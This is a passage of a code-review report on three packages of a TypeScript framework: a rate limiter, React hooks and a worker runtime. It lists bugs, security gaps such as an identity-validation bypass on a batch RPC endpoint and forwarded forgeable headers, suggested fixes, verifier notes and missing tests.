- dispatch.ts buildCaptureRecords: deadLettered=true for the _error_ outcome (handler throws with attempts > maxRetries) is untested — the dead-letter boundary tests (dispatch.test.ts:236-293) only cover explicit retry and ack.
- capture.ts sink: a non-2xx response from the root shard (e.g. 401 bad admin token) — currently indistinguishable from success — has no test pinning the intended behavior either way.
- create-queue-context.ts:28 malformed-binding branch: an env value present under the spec's binding name but missing send/sendBatch (e.g. a KV namespace bound to the wrong name) should be skipped and later raise the lazy directed error; only the fully-absent-binding case is tested (create-queues.test.ts:56-70).
- capture.ts shouldCaptureQueue: an explicit-but-unrecognized flag value (LUNORA_QUEUE_CAPTURE="yes"/"on") silently disables capture even in dev — behavior untested and undocumented.
- dispatch.ts:249: a batch delivered for an undeclared queue whose name matches an Object.prototype key ("constructor") — no test, and the current behavior is the wrong TypeError (see finding 1).
- define-queue.ts naming helpers: acronym and digit-boundary inputs (queueDefaultName("HTMLQueue"), queueBindingName("v2Queue")) are untested, so the no-split-on-consecutive-capitals behavior is unpinned.
- dispatch.ts describeThrownError: the plain-string throw branch (`throw "oops"` → error field "oops") is untested — cyclic-object and undefined throws are covered but not the string path.

<a id="lunoraratelimit"></a>

### @lunora/ratelimit

**Assessment:** A well-built package overall: the algorithm core is pure and clock-injected, construction-time config validation is thorough, the middleware fails closed by default, storage keys are collision-proof via percent-encoding, and the security surface is clean (no injection from external input — the only interpolated SQL identifier is the developer-supplied table name, and rate-limit keys are parameterized). The real problems are semantic: fixed-window reserve debt is wiped at every window boundary (making reserve effectively unlimited for that algorithm), the token bucket omits the never-admittable count>capacity guard its siblings have (returning a retryAfter that lies forever), and the middleware's catch-all converts deterministic misconfiguration into 503s — or, with failOpen, into a silently disabled limit.

#### 1. [MEDIUM / bug] Fixed-window reserve debt is forgiven at the window boundary, so reserve admits unbounded throughput — **verified: confirmed**

`packages/ratelimit/src/algorithms.ts:68`

When a new window starts, the carry is computed as `Math.max(0, prior.value)` (and 0 when `capacity` is unset), so a negative reserved balance is silently wiped instead of being repaid. Verified by execution: with `{ kind: 'fixed window', rate: 10, period: 1000 }`, 100 reserve calls of count=5 in one window all return ok:true (510 units admitted against a rate of 10, debt -500), and the next window immediately admits a fresh count=10 — the 500-unit debt vanishes. This contradicts the reserve contract in types.ts:84-88 ('reserving future capacity … retryAfter reports when the debt clears') and diverges from the token bucket, where debt is genuinely repaid via refill. The same forgiveness is mirrored in availableAt (algorithms.ts:196). Note: **tests**/algorithms.test.ts:158 asserts this behavior ('the debt is forgiven at the boundary'), so it may be a deliberate choice — but as written, `reserve: true` on a fixed-window limit does not limit anything beyond the per-call `count <= capacity` check, and retryAfter given to the reserving caller schedules work into capacity that other requests will also consume.

**Suggested fix:** Carry negative balances across the boundary (`carry = prior.value < 0 ? prior.value : (config.capacity !== undefined ? prior.value : 0)`), i.e. `base.value = min(capacity, carry + rate)` with debt preserved, matching token-bucket semantics — and update availableAt and the test to match. Alternatively, if forgiveness is intended, document it loudly on RateLimitArgs.reserve and consider a maxReserved bound.

**Verifier note:** Confirmed by code reading. In packages/ratelimit/src/algorithms.ts the fixed-window reserve path (lines 83-85) admits every call with count <= capacity regardless of accumulated negative balance, every such call gets the same retryAfter (next window boundary, line 81), and at the boundary the carry is Math.max(0, prior.value) with capacity set, else 0 (lines 67-70; mirrored in availableAt at 195-198) — so the reserved debt is silently erased and reserve:true on a fixed window enforces nothing beyond the per-call count <= capacity check. No upstream guard changes this: RateLimiter.run (rate-limiter.ts:196-219) only validates count is a positive integer and passes reserve through. Refutation attempts failed: (a) the behavior IS pinned by **tests**/algorithms.test.ts:158 ("the debt is forgiven at the boundary"), suggesting partial intent, but the public contract (types.ts:84-88, docs/index.mdx:97 — "retryAfter reports when the debt clears. Rejected only when count exceeds capacity") documents genuine debt semantics, and **tests**/rate-limiter.test.ts:139-141 even asserts the fixed-window negative balance "mirrors the token-bucket debt contract," which is false across the boundary — the repo is internally contradictory, so this is not cleanly by-design; (b) reachability is real but indirect: reserve is not exposed via the shipped middleware (middleware.ts passes only count/key) and is a server-side opt-in, so an attacker cannot set it directly — but any app using the documented reserve pacing pattern on a fixed-window limit gets effectively no rate limiting under external request volume. Severity adjusted from high to medium: opt-in flag, one of three algorithms, not attacker-settable, not on the default middleware path, and partially test-pinned; still a genuine contract violation in a security-relevant package (the token bucket repays debt via refill; fixed window forgives it, concentrating all reserved work into the same next window while forgetting the debt).

#### 2. [MEDIUM / bug] Token bucket lacks the count > capacity never-admittable guard its sibling algorithms have

`packages/ratelimit/src/algorithms.ts:44`

fixedWindow (line 91) and slidingWindow (line 150) explicitly throw when a non-reserve request exceeds capacity, with comments explaining that a finite retryAfter would be 'a lie the caller would chase forever'. tokenBucket has the guard only on its reserve path (line 48); the plain rejection path returns `retryAfter = ceil(deficit / ratePerMs)`. Since `available` is capped at `capacity` (line 35), a request with count > capacity can never be admitted. Verified by execution: rate=5, period=1000, count=6 returns { ok:false, retryAfter:200 }; retrying after 200ms returns { ok:false, retryAfter:200 } again, forever. A client honoring retryAfter (e.g. via the middleware's `data.retryAfter`) retry-loops indefinitely.

**Suggested fix:** Mirror the fixedWindow/slidingWindow guard: after the reserve branch, `if (options.count > capacity) throw new LunoraError('INTERNAL', …)`.

#### 3. [MEDIUM / bug] Middleware catch-all conflates caller-misuse INTERNAL errors with store unavailability; failOpen then disables the limit entirely

`packages/ratelimit/src/middleware.ts:67`

The try block wraps both limiter resolution and `resolved.limit(...)`. Deterministic configuration/misuse errors — unconfigured limit name (rate-limiter.ts:172), non-positive-integer count (rate-limiter.ts:202), and the count > capacity throws in algorithms.ts:92/151 — are LunoraError('INTERNAL') and are caught here alongside genuine store failures. Fail-closed, a permanent config bug is reported as 'rate limiter unavailable' 503 on every request, masking the root cause behind console.error. With `failOpen: true`, e.g. `rateLimit(limiter, 'send', { count: 20, failOpen: true })` against a capacity-10 fixed window silently admits every single request forever — the limit is a no-op with only a console line as evidence.

**Suggested fix:** Rethrow deterministic misuse errors instead of mapping them to availability: the package already depends on @lunora/errors, so `if (isLunoraError(error) && error.code === 'INTERNAL') throw error;` (or use isInternalCode) before the failOpen/503 handling.

#### 4. [MEDIUM / perf] No store ever expires entries — per-key state accumulates unboundedly

`packages/ratelimit/src/store.ts:11`

createMemoryStore's Map, createSqlStore's table, and createDbStore's rows are only deleted via explicit `reset()`. For limits keyed by client-derived values (per-IP, per-user, per-email), every distinct key leaves a row/entry forever, even though any entry older than one `period` (or a full token bucket) is semantically dead. On a long-lived Durable Object, an actor rotating keys grows DO memory (memory store) or billed SQLite storage (sql/db store) without bound; there is no sweep, TTL column, or opportunistic delete-on-full-refill anywhere in the package.

**Suggested fix:** Delete instead of persist when the evaluated value equals the fresh-key state (token bucket at full capacity, window fully reset), and/or add an opportunistic GC hook (e.g. periodic `DELETE FROM t WHERE ts < ?` in createSqlStore) so stale keys are reclaimed.

#### 5. [LOW / bug] RateLimitError reports deny-list rejections as TOO_MANY_REQUESTS (429), while the middleware maps the same condition to FORBIDDEN (403)

`packages/ratelimit/src/error.ts:25`

RateLimitError hardcodes `super('TOO_MANY_REQUESTS', …)` regardless of `status.reason`. A direct caller using `limiter.limit(name, { throws: true })` on a deny-listed key (rate-limiter.ts:189-191) therefore surfaces a 429 with `retryAfter: Infinity`, whereas middleware.ts:31-34 deliberately maps `deny` to FORBIDDEN/403 with no retryAfter. The same rejection thus produces different wire codes depending on which entry point threw, and a 429 invites clients to retry a key that will never be admitted.

**Suggested fix:** Pick the code from `status.reason` in the constructor (deny → FORBIDDEN/403), reusing the STATUS_BY_REASON mapping from middleware.ts.

#### 6. [LOW / refactor] availableAt duplicates all three algorithms' state-projection math; shard routing duplicated in RateLimiter

`packages/ratelimit/src/algorithms.ts:165`

availableAt (algorithms.ts:165-202) re-implements the token-bucket refill (lines 169-172 ≡ 33-35), the sliding-window weighting (178-192 ≡ 107-123), and the fixed-window rollover/carry expression (195-198 ≡ 67-70) verbatim. Any semantic fix — including the debt-forgiveness fix above — must be applied in two places or getValue silently diverges from limit/check. Separately, rate-limiter.ts duplicates the shard-routing key construction (`base` + hashToShard + `#<shard>` suffix) in getValue (lines 140-141) and run (lines 206-212).

**Suggested fix:** Extract a shared `projectBase(config, prior, now)` per algorithm that both evaluate and availableAt call, and a private `routeStorageKey(name, key, shards)` in RateLimiter used by both getValue and run.

#### Missing test coverage

- middleware failure policy: no test exercises a throwing limiter/store — neither the default fail-closed SERVICE_UNAVAILABLE/503 path nor failOpen:true admitting the request (middleware.ts:63-78)
- dbRateLimit (src/database-middleware.ts) has zero tests — per-call RateLimiter construction and forwarding of options.store (custom table/index/keyField) to createDbStore are unexercised
- run()'s count validation (rate-limiter.ts:201-202): no test that count 0, negative, fractional, or NaN throws the 'count must be a positive integer' error
- token-bucket non-reserve request with count > capacity: fixedWindow's and slidingWindow's throw paths are tested (algorithms.test.ts:141, 231) but the token bucket's divergent behavior (finite, perpetually unsatisfiable retryAfter) has no test at all
- normalize is only tested through limit(); reset() and getValue() with a normalizer (rate-limiter.ts:135, 160) are untested — a regression dropping normalization there would leave reset clearing the wrong bucket unnoticed
- sliding-window retryAfter on the cross-window branch (the intoNext computation, algorithms.ts:135-138, taken when the current window alone is over the limit) has no assertion on its numeric value
- storage-key shard-suffix disambiguation: the name-vs-key collision test exists (rate-limiter.test.ts:149) but no test covers a key/name containing '#' or the shard suffix interacting with encoded keys under shards > 1

<a id="lunorareact"></a>

### @lunora/react

**Assessment:** The package is in good overall health: hooks are carefully engineered around TanStack Query with deliberate, well-documented lifecycle decisions, and the test suite is substantial (23 files, ~113 tests covering subscriptions, pagination split/join, refcount churn, SSR, and auth). No exploitable security issues were found (the one redirect sink is scheme-validated); the real risks are two data-correctness bugs in the TanStack integration — usePreloadedQuery masking a live `null` push, and `"skip"` colliding with the empty-args cache key — plus a few low-severity lifecycle edge cases and a five-way cross-adapter duplication of the flags wire contract.

#### 1. [HIGH / bug] usePreloadedQuery masks a live null push with the stale preloaded value (`data ?? value`) — **verified: confirmed**

`packages/react/src/use-preloaded-query.ts:60`

The hook returns `data ?? value`. The subscription registry delivers server pushes via `queryClient.setQueryData(queryKey, value)`, so when a query legitimately re-evaluates to `null` (document deleted, access revoked), `data` becomes `null` and `??` falls back to the stale SSR-preloaded `value` — forever. The code comment at line 55-59 only reasons about `undefined`; it forgot that `??` also coalesces `null`, which is a normal Lunora query result. Failure scenario: `preloadQuery(api.posts.get, {id})` renders a post, the post is deleted, the server pushes `null` — the UI keeps rendering the deleted post's content until a full remount, while a plain `useQuery` of the same key correctly shows null.

**Suggested fix:** Track whether TanStack has a cache entry (e.g. `const hasData = queryClient.getQueryState(queryKey)?.data !== undefined` or use `data === undefined ? value : data`) so only a genuinely-absent cache value falls back to the preloaded token, and `null` passes through.

**Verifier note:** Verified every link of the claimed failure chain in the codebase. (1) use-preloaded-query.ts:60 returns `data ?? value`, and the comment at lines 55-59 reasons only about `undefined`, overlooking that `??` also coalesces `null`. (2) Server pushes reach the cache via `queryClient.setQueryData(queryKey, value)` (packages/react/src/cache.ts:77), fed by notifySubscription (packages/client/src/optimistic-layers.ts:59-74) which delivers `null` unfiltered — the client uses `undefined`, not `null`, as its no-value sentinel (lunora-client.ts:2547), so `null` is a first-class pushed value. TanStack v5 setQueryData only no-ops on `undefined`; `null` is stored and becomes `data`. (3) `null` is a normal Lunora query result: ctx.db.get is typed `Promise<DM[T] | null>` (server/src/data-model.ts:346, types.ts:466), so the canonical SSR detail-page pattern preloadQuery(api.posts.get, {id}) hits this exactly when the doc is deleted or access is revoked. (4) Plain useQuery (use-query.ts:59) returns `data` directly and shows null correctly — the divergence is real. (5) No test pins the null-push case; existing tests only use object values. No upstream validator, guard, or type constraint prevents the scenario. The bug is even slightly worse than claimed: refetch/poll-invalidation can't recover either, since a queryFn result of null is also coalesced away, and remount re-seeds the same stale initialData. High severity stands: permanent display of deleted/access-revoked content in a core hook of a real-time-consistency framework, though it is a correctness bug rather than a new data leak (the stale content was already delivered to the client). One-line fix: `data === undefined ? value : data`.

#### 2. [MEDIUM / bug] `useQuery(fn, "skip")` shares its cache key with a real `{}`-args query and returns its data

`packages/react/src/use-query.ts:29`

When `args === "skip"`, `argsRecord` is set to `{}` (line 29) and the queryKey becomes `["lunora", ref, {}, null]` (line 35) — the exact key a non-skipped `useQuery(fn, {})` uses. `enabled: !skipped` (line 39) prevents fetching, but TanStack's `useQuery` still returns cached `data` for the key even when disabled. Failure scenario: component A mounts `useQuery(api.items.list, {})` (populating the cache); component B mounts `useQuery(api.items.list, ready ? {filter} : "skip")` — while skipped it renders A's full unfiltered list instead of the documented `undefined` ("no network call, no subscription" implies no data). The existing skip test only asserts no client call with an empty cache, so it can't catch this.

**Suggested fix:** Use a dedicated sentinel in the key for the skipped state (e.g. `["lunora", "__skip__"]`) or return `undefined` explicitly when `skipped` instead of TanStack's `data`.

#### 3. [MEDIUM / reuse] Flags wire contract (reserved path, args shape, flagKind, fail-open subscribe loop) is copy-pasted across five adapter packages

`packages/react/src/use-flag.ts:16`

`FLAGS_EVAL_PATH = "__lunora_flags__:eval"`, the `FlagSubscribeArgs` shape, `flagKind`, `flagsReference`, and the cancelled-guarded, fail-open subscribe/teardown logic are re-declared verbatim in packages/react/src/use-flag.ts, packages/vue/src/use-flag.ts, packages/solid/src/create-flag.ts, packages/svelte/src/flag.ts, and packages/angular/src/flag.ts (verified by grep; `@lunora/flags/web.ts` and `@lunora/client` export none of it). The repo already has the established pattern for exactly this: `@lunora/client/pagination` and `@lunora/client/query` host the framework-neutral state machines that useSubscription and usePaginatedCore consume. Any change to the reserved path or the wire args (which codegen's emit.ts also references) currently requires five synchronized edits, and the attach-throw/cancellation semantics can drift per adapter.

**Suggested fix:** Extract a `@lunora/client/flags` (or extend `@lunora/client/query`) module exporting the reserved-path constant, `FlagSubscribeArgs`, `flagKind`, and a `createFlagSubscription(client, key, default, context, onValue)` helper; have each adapter bind it to its own reactivity primitive, as useSubscription already does with createQuerySubscription.

#### 4. [LOW / bug] Registry detach is not idempotent despite the comment claiming "Calling detach twice is a no-op"

`packages/react/src/cache.ts:97`

The detach closure re-reads `this.entries.get(key)` and decrements whatever entry currently lives under the hash (lines 98-110). It is only a no-op when the key has no entry. Failure scenario: consumer A attaches, detaches (entry deleted), consumer B attaches the same key (fresh entry, refCount 1); a stale second call of A's detach then finds B's entry, decrements it to 0, and closes B's live WS subscription while B is still mounted — B silently stops receiving pushes. The attach docblock says "call it exactly once per attach", so React's effect contract protects the in-repo callers, but the inline comment actively asserts the opposite guarantee and the registry is exported (`LunoraSubscriptionRegistry`) for external use.

**Suggested fix:** Make each detach closure single-shot (a `let detached = false` guard), which makes the comment true and the exported API safe.

#### 5. [LOW / bug] Transitioning args to "skip" leaves useStream permanently stuck in its last status with stale chunks

`packages/react/src/use-stream.ts:87`

When `skipped` flips to true the effect early-returns (line 87-89) after the previous effect's cleanup cancels the iterator with `stillMounted = false`, so no `complete`/`reset` action is ever dispatched. The hook keeps reporting `status: "streaming"` (or whatever it last was) and the old `chunks` even though the stream is dead. This is inconsistent with `useSubscription`, which explicitly clears its state on the same transition (use-subscription.ts line 46), and with the reducer's own `reset` action which exists for exactly this. Failure scenario: a chat UI streams a completion, the user switches args to "skip" mid-stream — the spinner keyed on `status === "streaming"` spins forever over frozen chunks.

**Suggested fix:** Dispatch `{ type: "reset" }` in the skipped branch before returning, mirroring useSubscription's skip teardown.

#### 6. [LOW / bug] useFlags/useFlag render stale values for one painted frame after the flag set or key changes

`packages/react/src/use-flag.ts:140`

The reset to defaults happens inside the subscribe `useEffect` (`setValues(currentFlags)` line 140; `setValue(currentDefault)` line 83), which runs after paint. When the `flags` record changes shape (e.g. `{a: false}` → `{b: 0}`), the first render returns the previous state object — missing the new keys and containing the old ones — violating the declared return type `T` (consumer reads `values.b` and gets `undefined` where the type promises `number`). For `useFlag`, a key change paints the previous flag's resolved value under the new key for one frame (e.g. `useFlag("hero-b", "control")` briefly shows hero-a's "variant"), which can flash the wrong experiment arm.

**Suggested fix:** Reset during render when the spec/key changes, using the same ref-guarded render-phase reset pattern usePaginatedCore already uses (use-paginated-core.ts lines 78-88), so the stale value never commits.

#### 7. [LOW / bug] Pagination reset key uses raw JSON.stringify and collapses shardKey "" with undefined, diverging from the stable query-key encoding

`packages/react/src/use-paginated-core.ts:70`

`baseArgsKey = JSON.stringify(baseArgs)` (line 70) is order-sensitive while every other identity in the package (query keys, effect deps) goes through `stableStringify`, which sorts keys and skips `undefined` fields. Failure scenario: a consumer builds args via conditional spread so property insertion order differs between renders with identical content — the query keys (stable hash) say nothing changed, but `resetKey` differs, so the feed silently resets to page one, dropping every loaded page. Additionally `resetKey` encodes `shardKey ?? ""` (line 78), so `shardKey: ""` and `shardKey: undefined` produce the same reset key even though `lunoraQueryKey` distinguishes them (`""` vs `null` slots) — a swap between those two shard targets keeps the old page-boundary state against new subscriptions.

**Suggested fix:** Build the reset key from `stableStringify(baseArgs)` and a distinct shardKey sentinel (e.g. `shardKey ?? "�none"` or reuse `serializeQueryKey` of a probe key).

#### Missing test coverage

- cache.ts polling fallback: no test covers client.subscribe throwing at attach time — the 5s setInterval(invalidateQueries) fallback, its error swallowing, and that the interval is cleared on the last detach are all unexercised (no test in **tests**/ mentions poll or invalidateQueries)
- payment.tsx safeRedirectHref: no test asserts that a javascript:/data: URL resolved by the trigger is rejected instead of reaching location.assign — the only security-relevant branch in the package is untested
- useQuery "skip" while another mounted component holds cached data for the same function with {} args — the existing skip test (use-query.test.tsx:46) only checks no client call against an empty cache, so the key-collision data leak goes undetected
- usePreloadedQuery receiving a live push of null — all push tests emit non-null objects, so the `data ?? value` stale-value masking is never exercised
- useStream args transitioning from real args to "skip" mid-stream — only mount-time skip is tested (use-stream.test.tsx:102); the stuck status/chunks state after the transition is uncovered
- use-auth generation guard: no test races a slow getCurrentUser against a newer token change to verify the last-write-wins behavior the `generation` counter exists for (use-auth.ts:44-79)
- useRateLimit only exercises `kind: "token bucket"`; the hook's fixed-window/sliding-window paths through evaluate(), and behavior when the `config` object identity changes mid-life, are untested
- useMutation's documented ref-counted `pending` across overlapping concurrent calls (onMutate/onSettled counting, use-mutation.ts:66-76) — tests only ever have one call in flight at a time

<a id="lunoraruntime"></a>

### @lunora/runtime

**Assessment:** The package is in strong overall health: input validation at every HTTP edge is unusually disciplined (byte-budgeted body readers, constant-time token compares, fail-closed shard/fan-out authorization, CSWSH guard, wire-redaction via toErrorBody), and the extracted admin-route modules are consistent and well-tested (~11k LOC of tests). The real defects are drift between parallel code paths: the batch RPC path skips the identity-contract gate the single-call path enforces, the WebSocket upgrade forwards trusted x-lunora-* headers it doesn't strip, and two admin-token/body-size fallbacks disagree with the global request guard.

#### 1. [HIGH / security] Batch RPC path bypasses the defineIdentity contract validation gate — **verified: confirmed**

`packages/runtime/src/create-worker.ts:2531`

handleBatchRpc resolves identity with the RAW resolver: `resolveForwardContext(request, env, options.resolveIdentity)` (line 2531), while handleRpc (line 2417), the WS upgrade (line 2144), buildHttpActionContext (line 2037), and serverQuery (line 2758) all use `publicResolveIdentity` — the resolver wrapped by wrapResolverWithContract, which validates claims against the app's `defineIdentity(...)` contract and downgrades/401s a violating identity. The comment at line 1498 explicitly says the wrapped resolver covers 'the PUBLIC data paths', but `/_lunora/rpc-batch` is a public data path (the client SDK's plan-088 batch transport). Failure scenario: an app configures `identity: defineIdentity({ onInvalid: "reject" })`; a token whose claims violate the contract is rejected with 401 on POST /_lunora/rpc but is forwarded verbatim as x-lunora-userid/x-lunora-identity to the shard on POST /_lunora/rpc-batch — the contract-violating claims become ctx.auth and feed RLS/authorizeShard as if valid.

**Suggested fix:** Change line 2531 to pass `publicResolveIdentity` (same as handleRpc), and add a batch-path test to identity-layer.test.ts pinning contract enforcement on /_lunora/rpc-batch.

**Verifier note:** Confirmed. handleBatchRpc (create-worker.ts:2531) resolves identity with the RAW options.resolveIdentity, whereas every other public data path (handleRpc:2417, WS upgrade:2144, buildHttpActionContext:2037, serverQuery:2758) uses publicResolveIdentity. publicResolveIdentity = wrapResolverWithContract(options.resolveIdentity, options.identity) (line 1504) is the ONLY place contract.validate() runs (identity-resolvers.ts:186-214); it 401s (onInvalid:"reject") or downgrades to anonymous (onInvalid:"anonymous") a contract-violating identity. authorizeRpcEnvelope (line 2267) does NOT re-validate against the contract — it only runs authorizeShard/authorizeFanOut on the identity as-is. The batch endpoint is publicly reachable: it is registered in internalRoutes (line 3052), handleBatchRpc only gates on POST (no admin auth), and the client SDK batch transport targets /_lunora/rpc-batch. resolveForwardContext builds x-lunora-userid/x-lunora-identity from the raw identity (lines 1120/1140) and those forwardedHeaders are copied into each per-shard sub-request (line 2614); the DO reconstructs ctx.auth from them (shard-do.ts:2039/2053). options.identity is set whenever the app declares defineIdentity — the generated app worker emits `identity: lunoraIdentityContract.X` (emit-app.ts:565), a supported Plan 080 feature. So an app with identity: defineIdentity({ onInvalid: "reject" }) rejects a contract-violating token on POST /_lunora/rpc but forwards it verbatim to the shard on POST /_lunora/rpc-batch, where the violating claims become ctx.auth and feed RLS/authorizeShard. No test pins batch-path contract validation (identity-layer.test.ts exercises only the /rpc path). The bad state is representable and externally reachable; the fix is a one-line change to pass publicResolveIdentity at line 2531. High severity is appropriate — it is a bypass of an explicitly-configured authorization/claim-validation gate on a publicly reachable data path, though it is somewhat mitigated by being a claims-shape (defense-in-depth) gate that still requires a validly-authenticated underlying token.

#### 2. [MEDIUM / bug] KV value PUT's 32 MiB budget is unreachable — the worker's global 1 MiB Content-Length guard 413s it first

`packages/runtime/src/kv-admin-routes.ts:20`

handleKvValuePut reads its body with KV_VALUE_MAX_BODY_BYTES (32 MiB, line 20/183) specifically because 'Cloudflare KV allows values up to 25 MiB, so the shared 1 MiB JSON limit would reject valid writes'. But every POST/PUT first passes create-worker.ts `handle()` (lines 3132–3137), which rejects any declared Content-Length > MAX_BODY_BYTES (1 MiB) with 413 before routing. Failure scenario: the Studio PUTs a 5 MiB KV value to /_lunora/admin/kv/value with a normal Content-Length header → 413 PAYLOAD_TOO_LARGE, despite the endpoint's own cap allowing it. Only chunked bodies that omit Content-Length can reach the 32 MiB reader, so the KV-specific cap is effectively dead code for real clients.

**Suggested fix:** Exempt the KV value path (or any route that declares its own budget) from the global Content-Length fast-path — e.g. look up the internal route first and let a per-route `maxBodyBytes` drive the header check — and add a full-worker test PUTting a >1 MiB value.

#### 3. [MEDIUM / bug] Scheduled backup ignores env.LUNORA_ADMIN_TOKEN, so composed workers can never run backups

`packages/runtime/src/create-worker.ts:2843`

runScheduledBackup hard-requires `options.adminToken` (lines 2843–2848) and builds the per-shard bearer from it (line 2852). Every other admin surface falls back to env.LUNORA_ADMIN_TOKEN — the request-time gates via resolveAdminTokenFromEnv/effectiveAdminToken (lines 1522–1534), handleSchedulerDispatch (line 1834), and recordAuthAttempt (line 2981). The code's own comment (line 1516–1518) says the generated composed-worker entry 'doesn't thread' adminToken and relies on the env var. Failure scenario: a composed-worker deployment with LUNORA_ADMIN_TOKEN in env and backupCron+backupStore configured — every backup cron fire throws BACKUP_NOT_CONFIGURED even though the token exists and handleScheduled receives `env`. scheduled-backup.test.ts only ever passes adminToken explicitly, so the gap is untested.

**Suggested fix:** Thread `env` into runScheduledBackup (handleScheduled already has it) and resolve the bearer as `options.adminToken ?? env.LUNORA_ADMIN_TOKEN`, matching handleSchedulerDispatch.

#### 4. [MEDIUM / security] WS upgrade forwards client-forgeable x-lunora-shard-binding / x-lunora-system / x-lunora-client-ip to the DO

`packages/runtime/src/create-worker.ts:2167`

handleWebSocketUpgrade clones ALL inbound headers (`new Headers(request.headers)`, line 2167) and deletes only x-lunora-userid / x-lunora-identity / x-lunora-identity-exp (lines 2168–2170). The RPC path is safe because it builds forward headers from scratch, but the upgrade request reaches the DO with any other client-supplied x-lunora-* header intact. The DO trusts these: packages/do/src/shard-do.ts:2005 persistently learns `this.shardBinding` from x-lunora-shard-binding on EVERY fetch (including upgrades), and the relay hub uses it to address sibling DOs via env[binding]. The worker only overwrites the header when resolveShardBindingName finds the binding (line 2191–2194); when it returns undefined (e.g. a wrapped/non-env-identical shardDO), a client-chosen binding name survives and poisons the DO's relay routing. x-lunora-system / x-lunora-client-ip are documented as server-minted-only (lines 1644, 1098–1101) yet also ride the upgrade unstripped.

**Suggested fix:** In handleWebSocketUpgrade, strip every `x-lunora-*` header from the clone before re-setting the resolved identity trio and the shard binding (mirror packages/do/src/batch.ts's header allowlist), and add a forged-x-lunora-shard-binding upgrade test.

#### 5. [LOW / bug] Batch response's x-d1-bookmark is an arbitrary shard's bookmark when a batch spans shards

`packages/runtime/src/create-worker.ts:2643`

handleBatchRpc fans per-shard sub-batches out with Promise.all; each completion does `if (bookmark) latestBookmark = bookmark` (lines 2643–2647), so the single `x-d1-bookmark` returned (line 2690) is whichever shard finished LAST, not a max/merge. Failure scenario: a batch carries a mutation on shard A (new bookmark N+1) and a read on shard B (older bookmark M); if B's sub-batch resolves last, the client pins its next read to M and read-your-writes for the shard-A mutation is lost. Single-shard batches are unaffected.

**Suggested fix:** Return per-entry bookmarks (or only propagate a bookmark when exactly one shard produced one), since D1 bookmarks from different sources aren't comparable.

#### 6. [LOW / bug] Batch entries skip the args-shape validation the single-call envelope enforces

`packages/runtime/src/batch.ts:44`

normalizeBatchCall forwards `call.args` with a bare cast: `args: call.args === undefined ? {} : (call.args as Record<string, unknown>)` (line 44) — a string, number, or array flows through to the shard's /rpc-batch body. parseEnvelope (create-worker.ts:1238) explicitly rejects exactly this (`RPC \`args\` must be an object`, 400) 'rather than forwarding a malformed envelope the shard then has to defend against'. Failure scenario: `{calls:[{functionPath:"messages:list", args:"x"}]}` reaches the DO with a non-object args where the same payload on /_lunora/rpc is a clean 400 — the two transports disagree at the trust boundary.

**Suggested fix:** Add the same non-null/non-array object check to normalizeBatchCall and throw BAD_REQUEST.

#### 7. [LOW / perf] relayProbeCache grows unboundedly — expired entries are never evicted

`packages/runtime/src/create-worker.ts:1293`

relayProbeCache is a module-scope Map keyed by shardKey (line 1293); probeRelayCount always `set`s an entry per probed key (line 1329) and nothing ever deletes expired entries. The shardKey comes from the client-chosen `?shard=` query param on WS upgrades (line 2138). Failure scenario: under `allowUnauthenticatedShardAccess: true` (or a permissive authorizeShard), a client cycling distinct shard values adds one cache entry + one DO round-trip per upgrade, growing isolate memory monotonically; even benign high-cardinality shard sets retain dead entries for the isolate's lifetime.

**Suggested fix:** Delete the expired entry on read-miss and/or bound the map (evict oldest past a cap of a few thousand entries).

#### 8. [LOW / refactor] Dead no-op bookmark re-set branch in dispatchSingleShard

`packages/runtime/src/create-worker.ts:2355`

Lines 2355–2363: when the shard response carries x-d1-bookmark, the code copies all response headers (`new Headers(response.headers)`), sets the SAME header to the SAME value it just read from that copy, and rebuilds the Response (also dropping statusText). The branch is observationally identical to `return response` — the header is already present in the copied set — so it's pure allocation with no effect. It reads as if it were load-bearing for bookmark propagation, which misleads maintenance.

**Suggested fix:** Delete the conditional and return `response` directly (the surrounding emitRpcEvent logic is unaffected).

#### 9. [LOW / reuse] base64url codec implemented three times; constantTimeEqual duplicated cross-package despite the shared/ mechanism existing for exactly this

`packages/runtime/src/connector-cdc.ts:34`

The byte→binary-string→btoa base64url encode (and the atob reverse) is hand-rolled in three places: verifyHmacSignature (create-worker.ts:1401–1407), encodeRankPageCursor/decodeRankPageCursor (query-coordinator.ts:809–849), and encodeConnectorCursor/decodeConnectorCursor (connector-cdc.ts:34–81). Separately, constantTimeEqual (create-worker.ts:1367) carries a 'Keep in sync with packages/do/src/shard-do.ts' comment because the two packages avoid a dependency edge — but the repo's top-level shared/ folder (bundler-inlined, zero-dep, e.g. shared/stable-key.ts imported by client+react+do) exists precisely for this no-edge case. Concrete payoff: one security-sensitive compare that cannot silently drift between worker and DO, and one codec whose padding/url-alphabet quirks are fixed in one place.

**Suggested fix:** Add shared/base64url.ts and shared/constant-time-equal.ts and import them by relative path from runtime and do, per the CLAUDE.md shared/ rules.

#### 10. [LOW / security] CORS preflight reflects Access-Control-Request-Headers verbatim, silently ignoring the configured allowedHeaders

`packages/runtime/src/security-headers.ts:506`

handleCorsPreflight sets `access-control-allow-headers` to `requested ?? resolved.cors.allowedHeaders.join(", ")` (line 506). Whenever the browser sends Access-Control-Request-Headers (it always does for non-simple headers), the client's list is echoed wholesale, so a `cors: { allowedHeaders: ["Content-Type"] }` config never actually restricts anything — any header is preflighted through for an allowlisted origin. The option is thus decorative for the case it exists for. Impact is bounded (origin must already be allowlisted) but the configured policy is not the enforced policy.

**Suggested fix:** Intersect the requested header list with `allowedHeaders` (case-insensitively) instead of echoing it, or document that allowedHeaders is only the no-request-headers fallback.

#### Missing test coverage

- Identity-contract enforcement on POST /_lunora/rpc-batch: identity-layer.test.ts covers the contract gate only through resolver wrappers and single-call paths; no test asserts a contract-violating identity is downgraded/401'd on the batch transport (would have caught the publicResolveIdentity bypass at create-worker.ts:2531).
- WS upgrade header hygiene beyond the identity trio: create-worker.test.ts (lines ~260-295) proves forged x-lunora-userid/x-lunora-identity are stripped, but nothing asserts x-lunora-shard-binding / x-lunora-system / x-lunora-client-ip cannot ride a client upgrade to the DO.
- Full-worker KV value PUT above 1 MiB: kv-admin.test.ts exercises the route handlers but never a worker.fetch() with a >1 MiB declared Content-Length, so the global 413 guard defeating KV_VALUE_MAX_BODY_BYTES is invisible to the suite.
- Scheduled backup with the admin token only in env.LUNORA_ADMIN_TOKEN (the composed-worker default per create-worker.ts:1516) — scheduled-backup.test.ts always passes options.adminToken explicitly and only pins the throw when absent.
- x-d1-bookmark selection when a batch spans multiple shards with distinct bookmarks (the latestBookmark last-writer-wins race in handleBatchRpc has no test).
